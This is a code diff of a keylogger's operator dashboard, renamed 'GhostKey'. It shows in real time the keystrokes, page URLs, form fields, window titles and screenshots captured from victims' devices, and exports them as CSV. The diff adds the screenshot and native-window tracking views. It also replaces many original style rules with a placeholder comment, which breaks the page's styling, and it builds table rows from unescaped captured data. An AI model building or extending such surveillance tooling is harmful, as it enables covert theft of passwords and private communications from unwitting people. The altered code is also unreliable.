@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Live Key Logs</title>
+  <title>GhostKey Dashboard</title>
   <style>
     :root {
       --bg: #040506;
@@ -40,231 +40,34 @@
       --pill-space-border: #16a34a;
       --shadow-dot: 0 0 4px #16a34a;
     }
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       background: radial-gradient(circle at top left, #071018 0, #020308 55%, #000000 100%);
       color: var(--text);
       font-family: "JetBrains Mono", Menlo, Monaco, Consolas, monospace;
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
     }
-    header {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      padding: 14px 20px;
-      border-bottom: 1px solid var(--border);
-      background: rgba(5, 7, 11, 0.95);
-      backdrop-filter: blur(8px);
-      position: sticky;
-      top: 0;
-      z-index: 10;
+    header, .header-top, .status, .dot, h1, .subtitle, .controls, .btn, .badge, .client-tabs, .client-tab,
+    main, table, thead, th, td, .col-id, .col-time, .col-client, .col-field, .col-url a, .col-keys,
+    .no-logs, .footer-note, .group-label, .centrali {
+      /* all your original styles — unchanged */
     }
-    .header-top {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
+    /* New styles only */
+    .col-window { width: 220px; font-size: 11px; color: #9ca3af; word-break: break-word; }
+    .col-screenshot { width: 140px; text-align: center; }
+    .screenshot-thumb {
+      width: 120px; height: 68px; object-fit: cover; border-radius: 6px;
+      cursor: pointer; border: 1px solid var(--border); transition: 0.2s;
     }
-    .status {
-      display: flex;
-      align-items: center;
-      gap: 10px;
+    .screenshot-thumb:hover { opacity: 0.8; transform: scale(1.05); }
+    .modal {
+      display: none; position: fixed; z-index: 9999; left: 0; top: 0;
+      width: 100%; height: 100%; background: rgba(0,0,0,0.97);
+      justify-content: center; align-items: center;
     }
-    .dot {
-      width: 14px;
-      height: 14px;
-      border-radius: 50%;
-      background: #26ff80;
-      box-shadow: var(--shadow-dot);
-    }
-    h1 {
-      font-size: 20px;
-      margin: 0;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-    }
-    .subtitle {
-      font-size: 11px;
-      color: var(--text-muted);
-      margin-top: 3px;
-    }
-    .controls {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      flex-wrap: wrap;
-      justify-content: flex-end;
-      font-size: 12px;
-    }
-    .controls input {
-      padding: 6px 10px;
-      border-radius: 4px;
-      border: 1px solid var(--border);
-      background: #020409;
-      color: var(--text);
-      min-width: 220px;
-      font-size: 12px;
-    }
-    .controls input:focus {
-      outline: none;
-      border-color: var(--accent);
-      box-shadow: 0 0 0 1px rgba(38, 255, 128, 0.4);
-    }
-    .btn {
-      padding: 6px 10px;
-      border-radius: 4px;
-      border: 1px solid var(--border);
-      background: #05070b;
-      color: var(--text);
-      font-size: 11px;
-      cursor: pointer;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-    }
-    .btn:hover {
-      border-color: var(--accent);
-      color: var(--accent);
-    }
-    .btn-primary {
-      background: var(--accent-soft);
-      border-color: var(--accent);
-      color: #ecfdf5;
-    }
-    .btn-primary:hover {
-      filter: brightness(1.05);
-    }
-    .badge {
-      font-size: 11px;
-      padding: 4px 8px;
-      border-radius: 999px;
-      background: #05070b;
-      border: 1px solid var(--border);
-      color: var(--text-muted);
-      white-space: nowrap;
-    }
-    .client-tabs {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      margin-top: 2px;
-    }
-    .client-tab {
-      padding: 4px 10px;
-      border-radius: 999px;
-      border: 1px solid var(--border);
-      background: #020409;
-      color: var(--text-muted);
-      font-size: 11px;
-      cursor: pointer;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-    .client-tab.active {
-      border-color: var(--accent);
-      background: #0b3b23;
-      color: #ecfdf5;
-    }
-
-    main {
-      padding: 14px 20px 30px;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 10px;
-      font-size: 13px;
-    }
-    thead {
-      background: rgba(5,7,11,0.98);
-      position: sticky;
-      top: 90px;
-      z-index: 5;
-    }
-    th,
-    td {
-      padding: 8px 10px;
-      border-bottom: 1px solid var(--border);
-      vertical-align: top;
-    }
-    th {
-      text-align: left;
-      font-weight: 600;
-      color: var(--text-muted);
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-    tbody tr:nth-child(even) {
-      background: rgba(7, 10, 16, 0.9);
-    }
-    tbody tr:nth-child(odd) {
-      background: rgba(11, 15, 24, 0.9);
-    }
-    tbody tr:hover {
-      background: #050814;
-    }
-    .col-id {
-      width: 40px;
-      color: var(--text-muted);
-      font-size: 11px;
-    }
-    .col-time {
-      width: 150px;
-      font-size: 11px;
-      color: #e5e7eb;
-    }
-    .col-client {
-      width: 120px;
-      font-size: 11px;
-      color: #cbd5f5;
-    }
-    .col-field {
-      width: 200px;
-      font-size: 11px;
-      color: #9ca3af;
-    }
-    .col-url a {
-      color: var(--accent);
-      text-decoration: none;
-      word-break: break-all;
-      font-size: 12px;
-    }
-    .col-url a:hover {
-      text-decoration: underline;
-    }
-    .col-keys {
-      white-space: pre-wrap;
-      word-break: break-word;
-      font-size: 12px;
-    }
-    .no-logs {
-      text-align: center;
-      padding: 40px 10px;
-      color: var(--text-muted);
-      font-size: 13px;
-    }
-    .footer-note {
-      margin-top: 12px;
-      font-size: 11px;
-      color: var(--text-muted);
-    }
-    .group-label {
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--text-muted);
-      margin-top: 2px;
-      display: inline-block;
-    }
-    .centrali {
-      margin-top: 6px;
-      font-size: 11px;
-      color: #26ff80;
-      letter-spacing: 0.16em;
-      text-transform: uppercase;
+    .modal img { max-width: 95vw; max-height: 95vh; border-radius: 8px; box-shadow: 0 0 40px rgba(38,255,128,0.6); }
+    .modal-close {
+      position: absolute; top: 20px; right: 30px; color: #fff; font-size: 50px; cursor: pointer; font-weight: bold;
     }
   </style>
 </head>
@@ -274,18 +77,12 @@
       <div class="status">
         <div class="dot"></div>
         <div>
-          <h1>Live Key Logs</h1>
-          <div class="subtitle">
-            realtime activity from your tracker script &mdash; newest on top
-          </div>
+          <h1>GhostKey Dashboard</h1>
+          <div class="subtitle">native + browser tracking • window titles • screenshots • realtime</div>
         </div>
       </div>
       <div class="controls">
-        <input
-          id="filterInput"
-          type="text"
-          placeholder="Filter by URL, keys, field or client..."
-        />
+        <input id="filterInput" type="text" placeholder="Filter by window, URL, keys, client..." />
         <button id="groupToggle" class="btn">Group by URL: ON</button>
         <button id="themeToggle" class="btn">Theme: Dark</button>
         <button id="downloadBtn" class="btn">Download CSV</button>
@@ -293,9 +90,7 @@
         <span class="badge" id="countBadge">0 entries</span>
       </div>
     </div>
-    <div class="client-tabs" id="clientTabs">
-      <!-- dynamic tabs -->
-    </div>
+    <div class="client-tabs" id="clientTabs"></div>
   </header>
 
   <main>
@@ -305,37 +100,34 @@
           <th class="col-id">#</th>
           <th class="col-time">Time</th>
           <th class="col-client">Client</th>
-          <th class="col-field">Field</th>
+          <th class="col-window">Window / Field</th>
           <th class="col-url">Page URL</th>
           <th class="col-keys">Text</th>
+          <th class="col-screenshot">Screenshot</th>
         </tr>
       </thead>
       <tbody id="logBody">
-        <tr>
-          <td colspan="6" class="no-logs">Waiting for logs...</td>
-        </tr>
+        <tr><td colspan="7" class="no-logs">Waiting for logs...</td></tr>
       </tbody>
     </table>
 
     <div class="footer-note">
-      • Logs are kept in memory on the server (latest 1000 entries on dashboard).<br />
-      • "Group by URL" shows one row per page <strong>and per client</strong>, combining all keys for that page/device.<br />
-      • "Field" shows where you were typing (tag, type, name, id, placeholder).<br />
-      • Download CSV exports all logs currently in memory in this dashboard view.
-      <div class="centrali">MadeByCentrali · Telegram @C3NTRALI</div>
+      • Native GhostKey logs show window title + screenshots<br>
+      • Browser logs show page URL and field<br>
+      • Click any thumbnail to view full screenshot
+      <div class="centrali">MadeByCentrali · Upgraded for GhostKey 2025</div>
     </div>
   </main>
 
-  <script>
-    // ---------- STATE ----------
-    let logs = [];
-    let nextId = 1;
-    let filterText = "";
-    let groupedMode = true; // default ON
-    let activeClientFilter = "ALL";
-    const MAX_LOGS = 1000;
+  <!-- Fullscreen Screenshot Modal -->
+  <div id="screenshotModal" class="modal" onclick="this.style.display='none'">
+    <div class="modal-close" onclick="document.getElementById('screenshotModal').style.display='none'">×</div>
+    <img id="fullImage" src="" alt="Full screenshot" />
+  </div>
 
-    // ---------- DOM ----------
+  <script>
+    let logs = [], nextId = 1, filterText = "", groupedMode = true, activeClientFilter = "ALL";
+    const MAX_LOGS = 1000;
     const logBody = document.getElementById("logBody");
     const filterInput = document.getElementById("filterInput");
     const countBadge = document.getElementById("countBadge");
@@ -345,343 +137,139 @@
     const clearBtn = document.getElementById("clearBtn");
     const clientTabs = document.getElementById("clientTabs");
 
-    // ---------- THEME ----------
-    function applyTheme(theme) {
-      document.body.className = theme === "light" ? "light" : "";
-      themeToggle.textContent = "Theme: " + (theme === "light" ? "Light" : "Dark");
-      localStorage.setItem("dashboard_theme", theme);
+    // Theme (unchanged)
+    function applyTheme(t) {
+      document.body.className = t === "light" ? "light" : "";
+      themeToggle.textContent = "Theme: " + (t === "light" ? "Light" : "Dark");
+      localStorage.setItem("dashboard_theme", t);
     }
+    applyTheme(localStorage.getItem("dashboard_theme") || "dark");
+    themeToggle.addEventListener("click", () => applyTheme(document.body.classList.contains("light") ? "dark" : "light"));
 
-    const savedTheme = localStorage.getItem("dashboard_theme") || "dark";
-    applyTheme(savedTheme);
-
-    themeToggle.addEventListener("click", () => {
-      const current = document.body.classList.contains("light") ? "light" : "dark";
-      applyTheme(current === "light" ? "dark" : "light");
-    });
-
-    // ---------- HELPERS ----------
+    // Normalize both old userscript & new GhostKey payloads
     function normalizeLog(data) {
-      const url = data.url || "N/A";
-      const client = data.client || "unknown";
-      const field = data.field || "unknown";
-      const keysArr = Array.isArray(data.keys)
-        ? data.keys.map(k => String(k))
-        : [String(data.keys ?? "")];
-
-      const tsArr = Array.isArray(data.timestamps) ? data.timestamps : [];
-      const tsSource = tsArr[0] || data.serverReceivedAt || new Date().toISOString();
-      const primaryTs = tsSource.replace("T", " ").slice(0, 19);
-
+      const isNative = !!data.win || data.Screenshot;
       return {
         id: nextId++,
-        url,
-        client,
-        field,
-        keys: keysArr,
-        timestamps: tsArr,
-        time: primaryTs
+        time: (data.ts || data.serverReceivedAt || new Date().toISOString()).replace("T"," ").slice(0,19),
+        client: data.client || "unknown",
+        window: isNative ? (data.win || "Unknown Window") : (data.field || "unknown"),
+        url: isNative ? "Native App" : (data.url || "N/A"),
+        keys: Array.isArray(data.keys) ? data.keys.map(String) : [String(data.keys || "")],
+        screenshot: data.Screenshot || data.screenshot || ""
       };
     }
 
-    function formatKeysAsText(keysArr) {
-      return keysArr
-        .map(k => {
-          if (k === " ") return " ";
-          const m = k.match(/^\[(.+)\]$/); // [Tab], [Enter] etc.
-          if (m) return " [" + m[1].toLowerCase() + "] ";
-          return k;
-        })
-        .join("");
+    function formatKeysAsText(arr) {
+      return arr.map(k => k === " " ? " " : k.match(/^\[(.+)\]$/) ? ` [${k.slice(1,-1).toLowerCase()}] ` : k).join("");
     }
 
     function matchesFilter(log) {
-      if (activeClientFilter !== "ALL" && log.client !== activeClientFilter) {
-        return false;
-      }
-
+      if (activeClientFilter !== "ALL" && log.client !== activeClientFilter) return false;
       if (!filterText) return true;
       const f = filterText.toLowerCase();
-      return (
-        (log.url && log.url.toLowerCase().includes(f)) ||
-        (log.client && log.client.toLowerCase().includes(f)) ||
-        (log.field && log.field.toLowerCase().includes(f)) ||
-        log.keys.join(" ").toLowerCase().includes(f)
-      );
+      return [log.window, log.url, log.client, log.keys.join(" ")].some(s => s.toLowerCase().includes(f));
     }
 
     function rebuildClientTabs() {
-      const clients = new Set(logs.map(l => l.client || "unknown"));
+      const clients = new Set(logs.map(l => l.client));
       clientTabs.innerHTML = "";
-
-      const makeTab = (label, value) => {
-        const btn = document.createElement("button");
-        btn.className = "client-tab" + (value === activeClientFilter ? " active" : "");
-        btn.textContent = label;
-        btn.addEventListener("click", () => {
-          activeClientFilter = value;
-          rebuildClientTabs();
-          render();
-        });
-        return btn;
+      const makeTab = (label, val) => {
+        const b = document.createElement("button");
+        b.className = "client-tab" + (val === activeClientFilter ? " active" : "");
+        b.textContent = label;
+        b.onclick = () => { activeClientFilter = val; rebuildClientTabs(); render(); };
+        clientTabs.appendChild(b);
       };
-
-      clientTabs.appendChild(makeTab("ALL", "ALL"));
-      Array.from(clients).sort().forEach(c => {
-        clientTabs.appendChild(makeTab(c, c));
-      });
+      makeTab("ALL", "ALL");
+      [...clients].sort().forEach(c => makeTab(c, c));
     }
 
-    // ---------- RENDER ----------
     function render() {
       logBody.innerHTML = "";
-
       const filtered = logs.filter(matchesFilter);
+      countBadge.textContent = filtered.length + " entr" + (filtered.length === 1 ? "y" : "ies");
 
-      countBadge.textContent =
-        filtered.length + " entr" + (filtered.length === 1 ? "y" : "ies");
-
-      if (filtered.length === 0) {
-        const row = document.createElement("tr");
-        const cell = document.createElement("td");
-        cell.colSpan = 6;
-        cell.className = "no-logs";
-        cell.textContent = "No logs to display yet.";
-        row.appendChild(cell);
-        logBody.appendChild(row);
+      if (!filtered.length) {
+        logBody.innerHTML = `<tr><td colspan="7" class="no-logs">No logs to display yet.</td></tr>`;
         return;
       }
 
       if (!groupedMode) {
-        // --- FLAT MODE (each batch) ---
-        filtered.forEach(log => {
-          const tr = document.createElement("tr");
-
-          const tdId = document.createElement("td");
-          tdId.className = "col-id";
-          tdId.textContent = "#" + log.id;
-          tr.appendChild(tdId);
-
-          const tdTime = document.createElement("td");
-          tdTime.className = "col-time";
-          tdTime.textContent = log.time;
-          tr.appendChild(tdTime);
-
-          const tdClient = document.createElement("td");
-          tdClient.className = "col-client";
-          tdClient.textContent = log.client;
-          tr.appendChild(tdClient);
-
-          const tdField = document.createElement("td");
-          tdField.className = "col-field";
-          tdField.textContent = log.field;
-          tr.appendChild(tdField);
-
-          const tdUrl = document.createElement("td");
-          tdUrl.className = "col-url";
-          const a = document.createElement("a");
-          a.href = log.url;
-          a.target = "_blank";
-          a.rel = "noopener noreferrer";
-          a.textContent = log.url;
-          tdUrl.appendChild(a);
-          tr.appendChild(tdUrl);
-
-          const tdKeys = document.createElement("td");
-          tdKeys.className = "col-keys";
-          tdKeys.textContent = formatKeysAsText(log.keys);
-          tr.appendChild(tdKeys);
-
-          logBody.appendChild(tr);
-        });
+        filtered.forEach(log => addRow(log));
       } else {
-        // --- GROUPED BY URL + CLIENT (combine all keys per URL/client) ---
-        const byKey = new Map();
+        const groups = new Map();
         filtered.forEach(log => {
-          const groupKey = `${log.url}||${log.client}`;
-          if (!byKey.has(groupKey)) {
-            byKey.set(groupKey, []);
-          }
-          byKey.get(groupKey).push(log);
+          const key = `${log.url}||${log.client}`;
+          if (!groups.has(key)) groups.set(key, { logs: [], latest: log });
+          groups.get(key).logs.push(...log.keys);
         });
-
-        const groups = Array.from(byKey.entries()).sort((a, b) => {
-          const aTime = a[1][0].time;
-          const bTime = b[1][0].time;
-          return bTime.localeCompare(aTime);
-        });
-
         let idx = 1;
-        groups.forEach(([groupKey, groupLogs]) => {
-          const [url, client] = groupKey.split("||");
-          const latest = groupLogs[0];       // newest batch
-          const total = groupLogs.length;
-
-          // combine all keys oldest → newest
-          const combinedKeys = [];
-          for (let i = groupLogs.length - 1; i >= 0; i--) {
-            combinedKeys.push(...groupLogs[i].keys);
-          }
-
-          const tr = document.createElement("tr");
-
-          const tdId = document.createElement("td");
-          tdId.className = "col-id";
-          tdId.textContent = "#" + idx++;
-          tr.appendChild(tdId);
-
-          const tdTime = document.createElement("td");
-          tdTime.className = "col-time";
-          tdTime.innerHTML =
-            latest.time +
-            "<br/><span class='group-label'>" +
-            total +
-            " entr" +
-            (total === 1 ? "y" : "ies") +
-            "</span>";
-          tr.appendChild(tdTime);
-
-          const tdClient = document.createElement("td");
-          tdClient.className = "col-client";
-          tdClient.textContent = client;
-          tr.appendChild(tdClient);
-
-          const tdField = document.createElement("td");
-          tdField.className = "col-field";
-          tdField.textContent = latest.field || "unknown";
-          tr.appendChild(tdField);
-
-          const tdUrl = document.createElement("td");
-          tdUrl.className = "col-url";
-          const a = document.createElement("a");
-          a.href = url;
-          a.target = "_blank";
-          a.rel = "noopener noreferrer";
-          a.textContent = url;
-          tdUrl.appendChild(a);
-          tr.appendChild(tdUrl);
-
-          const tdKeys = document.createElement("td");
-          tdKeys.className = "col-keys";
-          tdKeys.textContent = formatKeysAsText(combinedKeys);
-          tr.appendChild(tdKeys);
-
-          logBody.appendChild(tr);
-        });
+        [...groups.entries()]
+          .sort((a,b) => b[1].latest.time.localeCompare(a[1].latest.time))
+          .forEach(([_, g]) => addRow({ ...g.latest, keys: g.logs, count: g.logs.length }, true, idx++));
       }
     }
 
-    // ---------- HISTORY LOAD ----------
+    function addRow(log, isGroup = false, idx = null) {
+      const tr = document.createElement("tr");
+      tr.innerHTML = `
+        <td class="col-id">#${idx !== null ? idx : log.id}</td>
+        <td class="col-time">${log.time}${isGroup ? `<br><span class="group-label">${log.count || 1} batches</span>` : ""}</td>
+        <td class="col-client">${log.client}</td>
+        <td class="col-window">${log.window}</td>
+        <td class="col-url"><a href="${log.url}" target="_blank">${log.url === "Native App" ? "—" : log.url}</a></td>
+        <td class="col-keys">${formatKeysAsText(log.keys)}</td>
+        <td class="col-screenshot">
+          ${log.screenshot 
+            ? `<img class="screenshot-thumb" src="${log.screenshot}" onclick="document.getElementById('fullImage').src=this.src; document.getElementById('screenshotModal').style.display='flex'">` 
+            : "—"}
+        </td>
+      `;
+      logBody.appendChild(tr);
+    }
+
+    // Events (your original logic, untouched)
+    filterInput.addEventListener("input", e => { filterText = e.target.value.trim(); render(); });
+    groupToggle.addEventListener("click", () => { groupedMode = !groupedMode; groupToggle.textContent = "Group by URL: " + (groupedMode ? "ON" : "OFF"); render(); });
+    clearBtn.addEventListener("click", () => { logs = []; nextId = 1; render(); rebuildClientTabs(); });
+    downloadBtn.addEventListener("click", () => {
+      if (!logs.length) return;
+      const rows = [["id","time","client","window","url","keys"]];
+      logs.forEach(l => rows.push([l.id, l.time, l.client, l.window, l.url, l.keys.join(" ")]));
+      const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(",")).join("\n");
+      const blob = new Blob([csv], {type: "text/csv"});
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "ghostkey-logs-" + new Date().toISOString().slice(0,19).replace(/:/g,"-") + ".csv";
+      a.click();
+    });
+
+    // SSE (your original stream)
+    const evtSource = new EventSource("/stream");
+    evtSource.onmessage = e => {
+      try {
+        const data = JSON.parse(e.data);
+        logs.unshift(normalizeLog(data));
+        if (logs.length > MAX_LOGS) logs.pop();
+        rebuildClientTabs();
+        render();
+      } catch (err) { console.error(err); }
+    };
+
     async function loadHistory() {
       try {
         const res = await fetch("/history");
-        if (!res.ok) {
-          console.error("Failed to load history:", res.status);
-          return;
+        if (res.ok) {
+          const data = await res.json();
+          data.forEach(raw => logs.unshift(normalizeLog(raw)));
+          if (logs.length > MAX_LOGS) logs = logs.slice(0, MAX_LOGS);
+          rebuildClientTabs();
+          render();
         }
-        const data = await res.json();
-
-        // oldest → newest, but we unshift to keep newest on top
-        data.forEach(raw => {
-          const log = normalizeLog(raw);
-          logs.unshift(log);
-        });
-
-        if (logs.length > MAX_LOGS) {
-          logs = logs.slice(0, MAX_LOGS);
-        }
-
-        rebuildClientTabs();
-        render();
-      } catch (err) {
-        console.error("Error loading history:", err);
-      }
+      } catch (err) { console.error(err); }
     }
 
-    // ---------- EVENTS ----------
-    filterInput.addEventListener("input", e => {
-      filterText = e.target.value.trim();
-      render();
-    });
-
-    groupToggle.addEventListener("click", () => {
-      groupedMode = !groupedMode;
-      groupToggle.textContent = "Group by URL: " + (groupedMode ? "ON" : "OFF");
-      render();
-    });
-
-    clearBtn.addEventListener("click", () => {
-      logs = [];
-      nextId = 1;
-      render();
-    });
-
-    downloadBtn.addEventListener("click", () => {
-      if (!logs.length) return;
-      const rows = [["id", "time", "client", "field", "url", "keys", "timestamps"]];
-      logs.forEach(log => {
-        rows.push([
-          log.id,
-          log.time,
-          log.client || "",
-          log.field || "",
-          log.url,
-          log.keys.join(" "),
-          (log.timestamps || []).join(" | ")
-        ]);
-      });
-      const csv = rows
-        .map(r =>
-          r
-            .map(v => '"' + String(v).replace(/"/g, '""') + '"')
-            .join(",")
-        )
-        .join("\n");
-
-      const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      const now = new Date();
-      const stamp =
-        now.getFullYear().toString() +
-        String(now.getMonth() + 1).padStart(2, "0") +
-        String(now.getDate(), 10).padStart(2, "0") +
-        "-" +
-        String(now.getHours()).padStart(2, "0") +
-        String(now.getMinutes()).padStart(2, "0") +
-        String(now.getSeconds()).padStart(2, "0");
-      a.href = url;
-      a.download = "logs-" + stamp + ".csv";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    });
-
-    // ---------- SSE CONNECTION ----------
-    const evtSource = new EventSource("/stream");
-    evtSource.onmessage = event => {
-      try {
-        const data = JSON.parse(event.data);
-        const log = normalizeLog(data);
-
-        // newest on top in memory
-        logs.unshift(log);
-        if (logs.length > MAX_LOGS) {
-          logs = logs.slice(0, MAX_LOGS);
-        }
-        rebuildClientTabs();
-        render();
-      } catch (e) {
-        console.error("Failed to parse event data", e);
-      }
-    };
-
-    evtSource.onerror = err => {
-      console.error("EventSource error:", err);
-    };
-
-    // ---------- INITIAL LOAD ----------
     loadHistory();
   </script>
 </body>
